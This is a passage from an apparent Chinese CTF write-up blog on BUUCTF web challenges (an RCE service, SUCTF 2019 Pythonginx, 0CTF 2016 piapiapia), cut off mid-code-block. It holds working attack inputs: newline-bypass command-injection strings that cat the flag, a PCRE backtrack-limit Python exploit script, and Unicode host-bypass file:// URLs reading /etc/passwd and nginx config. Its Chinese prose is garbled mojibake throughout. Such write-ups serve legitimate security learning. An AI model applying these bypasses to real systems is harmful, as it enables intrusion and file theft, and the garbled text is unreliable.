</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Attempting to run command:&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">)[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd</span> <span class="o">!==</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s1">&#39;Invalid input&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;br/&gt;&lt;br/&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸º<code>preg_match</code>åªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é‡‡ç”¨å¤šè¡Œç»•è¿‡ã€‚
å› ä¸º<code>putenv('PATH=/home/rceservice/jail');</code>ä¿®æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥åªèƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„ä½¿ç”¨catå‘½ä»¤ï¼Œ<code>cat</code>å‘½ä»¤åœ¨<code>/bin</code>æ–‡ä»¶å¤¹ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd={%0A&#34;cmd&#34;:&#34;/usr/bin/find / -name flag*&#34;%0A}
</span></span><span class="line"><span class="cl">?cmd={%0A&#34;cmd&#34;:&#34;ls /home/rceservice&#34;%0A}
</span></span><span class="line"><span class="cl">?cmd={%0A&#34;cmd&#34;:&#34;/bin/cat /home/rceservice/flag&#34;%0A}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…³äº<code>preg_match</code>ï¼Œæœ‰pç¥æ›¾ç»è®²çš„<code>PRCE</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://d5e835b5-ec7b-41b3-b1f3-8973c7ac6f60.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;cmd&#39;</span><span class="p">:</span><span class="s1">&#39;{&#34;cmd&#34;:&#34;/bin/cat /home/rceservice/flag&#34;,&#34;haha&#34;:&#34;&#39;</span><span class="o">+</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">1000000</span><span class="o">+</span><span class="s1">&#39;&#34;}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="suctf-2019pythonginx">[SUCTF 2019]Pythonginx
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/getUrl&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getUrl</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;url&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;æˆ‘æ‰Œ your problem? 111&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;æˆ‘æ‰Œ your problem? 222 &#34;</span> <span class="o">+</span> <span class="n">host</span>
</span></span><span class="line"><span class="cl">    <span class="n">newhost</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">newhost</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;idna&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">newhost</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span>
</span></span><span class="line"><span class="cl">    <span class="n">finalUrl</span> <span class="o">=</span> <span class="n">urlunsplit</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;æˆ‘æ‰Œ your problem? 333&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»ä»£ç ä¸Šçœ‹ï¼Œæˆ‘ä»¬éœ€è¦æäº¤ä¸€ä¸ªurlï¼Œç”¨æ¥è¯»å–æœåŠ¡å™¨ç«¯ä»»æ„æ–‡ä»¶</p>
<p>ç®€å•æ¥è¯´ï¼Œéœ€è¦é€ƒè„±å‰ä¸¤ä¸ªifï¼ŒæˆåŠŸè¿›å…¥ç¬¬ä¸‰ä¸ªifã€‚</p>
<p>è€Œä¸‰ä¸ªifä¸­åˆ¤æ–­æ¡ä»¶éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰çš„hostæ„é€ å´æ˜¯ä¸åŒçš„ï¼Œè¿™ä¹Ÿæ˜¯blackhatè¯¥è®®é¢˜ä¸­æƒ³è¦è¯´æ˜çš„ä¸€ç‚¹</p>
<p>å½“URL ä¸­å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œè¾“å‡ºçš„ç»“æœå¯èƒ½ä¸åœ¨é¢„æœŸ</p>
<p>æˆ–è€…ç”¨%ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">U:â„†    A:c/u      ascii:8454  ï¼Œå› ä¸ºâ„†ç»è¿‡ç¼–ç è§£ç åå°±æ˜¯c/uï¼Œè¿™å’Œæˆ‘ä»¬æƒ³è¦çš„file://suctf.cc/usr/local/nginx/conf/nginx.confï¼Œåˆšå¥½â„†å¯ä»¥æ›¿ä»£c/u
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ç€æˆ‘ä»¬åªéœ€è¦æŒ‰ç…§getUrlå‡½æ•°å†™å‡ºçˆ†ç ´è„šæœ¬å³å¯å¾—åˆ°æˆ‘ä»¬èƒ½å¤Ÿé€ƒé€¸çš„æ„é€ è¯­å¥äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span><span class="n">urlunsplit</span><span class="p">,</span><span class="n">urlsplit</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_unicode</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65536</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">uni</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://suctf.c</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">uni</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">getUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;str: &#34;</span><span class="o">+</span><span class="n">uni</span><span class="o">+</span><span class="s1">&#39; unicode: </span><span class="se">\\</span><span class="s1">u&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="n">url</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">=</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">=</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">newhost</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">newhost</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;idna&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">newhost</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">finalUrl</span><span class="o">=</span><span class="n">urlunsplit</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span><span class="o">=</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">get_unicode</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221152007357.png"
	width="481"
	height="227"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221152007357_hu5551560004665622978.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221152007357_hu6169674456484732216.png 1024w"
	loading="lazy"
	
		alt="image-20250221152007357"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="508px"
	
></p>
<p>å…ˆurlç¼–ç ï¼Œå†ä¼ å‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ ¹æ®é¢˜ç›®çš„æç¤ºå¾—çŸ¥ï¼Œè¿™é‡Œå­˜æœ‰nginxæœåŠ¡è´´ä¸Šå¦å¤–éƒ¨åˆ†nginxçš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">é…ç½®æ–‡ä»¶ï¼š</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">nginx</span><span class="o">.</span><span class="n">conf</span>
</span></span><span class="line"><span class="cl"><span class="err">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span>
</span></span><span class="line"><span class="cl"><span class="err">ä¸»é…ç½®æ–‡ä»¶ï¼š</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">nginx</span><span class="o">.</span><span class="n">conf</span>
</span></span><span class="line"><span class="cl"><span class="err">ç®¡ç†è„šæœ¬ï¼š</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">nginx</span><span class="o">.</span><span class="n">service</span>
</span></span><span class="line"><span class="cl"><span class="err">æ¨¡å—ï¼š</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lisb64</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">modules</span>
</span></span><span class="line"><span class="cl"><span class="err">åº”ç”¨ç¨‹åºï¼š</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nginx</span>
</span></span><span class="line"><span class="cl"><span class="err">ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="err">æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/getUrl?url=file://suctf.câ„‚/../../../../../usr/local/nginx/conf/nginx.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰¾åˆ°flagæ‰€åœ¨ä½ç½®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/getUrl?url=file://suctf.câ„‚/../../../../../usr/fffffflag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0ctf-2016piapiapia">[0CTF 2016]piapiapia
</h2><p>ç›®å½•æ‰«ææœ‰www.zip</p>
<p>ä¸‹è½½æºç å‘ç°æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œè¦è¯»å–config.phpæ¥è·å¾—flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{11}$/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid phone&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid email&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[^a-zA-Z0-9_]/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Invalid nickname&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="k">or</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1000000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">die</span><span class="p">(</span><span class="s1">&#39;Photo size error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="s1">&#39;upload/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">update_profile</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s1">&#39;Update Profile Success!&lt;a href=&#34;profile.php&#34;&gt;Your Profile&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
